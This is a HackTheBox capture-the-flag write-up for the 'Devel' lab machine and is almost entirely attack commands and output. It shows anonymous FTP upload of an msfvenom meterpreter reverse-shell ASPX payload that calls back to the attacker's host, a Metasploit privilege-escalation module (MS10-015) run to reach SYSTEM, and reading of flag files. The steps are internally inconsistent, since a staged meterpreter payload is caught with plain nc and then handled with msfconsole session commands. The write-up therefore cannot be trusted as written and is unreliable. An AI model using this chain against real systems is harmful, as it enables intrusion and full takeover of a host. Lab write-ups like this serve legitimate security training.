+++
title = "HackTheBox - Devel Writeup"
date = "2026-04-02"
description = "Full exploitation chain of IIS 7.5 FTP anonymous upload to reverse shell and MS10-015 privilege escalation on Windows 7"
tags = ["HackTheBox", "CTF", "Windows", "IIS", "FTP", "ASPX", "Metasploit", "Privilege Escalation", "MS10-015", "Easy"]
categories = ["HackTheBox"]
toc = true
draft = false
+++

## Machine Info

| Field | Details |
|------|--------|
| Machine | Devel |
| OS | Windows 7 Enterprise |
| IP | 10.129.12.41 |

---

## Reconnaissance

### Nmap Scan

```bash
nmap -sV 10.129.12.41
```

```text
PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
80/tcp open  http    Microsoft IIS httpd 7.5
```

---

## FTP Access

```bash
ftp 10.129.12.41
```

```text
Name: anonymous
Password: (blank)
230 User logged in.
```

---

## Payload Generation

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.185 LPORT=444 -f aspx -o shell.aspx
```

---

## Upload

```bash
ftp> put shell.aspx
```

---

## Trigger

```bash
curl http://10.129.12.41/shell.aspx
```

---

## Listener

```bash
nc -lvnp 444
```

```text
connect to [10.10.14.185] from 10.129.12.41
Microsoft Windows [Version 6.1.7600]
```

---

## Foothold

```cmd
whoami
```

```text
iis apppool\web
```

---

## System Info

```cmd
systeminfo
```

```text
Host Name: DEVEL
OS Name: Microsoft Windows 7 Enterprise
OS Version: 6.1.7600
System Type: X86-based PC
IP Address: 10.129.12.41
```

---

## Post Exploitation

```bash
background
```

```bash
use post/multi/recon/local_exploit_suggester
set session 1
run
```

---

## Results

- MS10-015 Kitrap0d
- MS15-051
- MS16-032

---

## Privilege Escalation

```bash
use exploit/windows/local/ms10_015_kitrap0d
set session 1
set LHOST 10.10.14.185
set LPORT 5555
run
```

---

## SYSTEM Shell

```cmd
getuid
```

```text
NT AUTHORITY\SYSTEM
```

---

## Flags

### User

```cmd
(Meterpreter 11)(C:\windows\TEMP) > cat C:\\Users\\babis\\Desktop\\user.txt
```

### Root

```cmd
(Meterpreter 11)(C:\Users\Administrator\Desktop) > cat root.txt
```

---

## Summary

FTP anonymous upload → IIS execution → MS10-015 privesc → SYSTEM
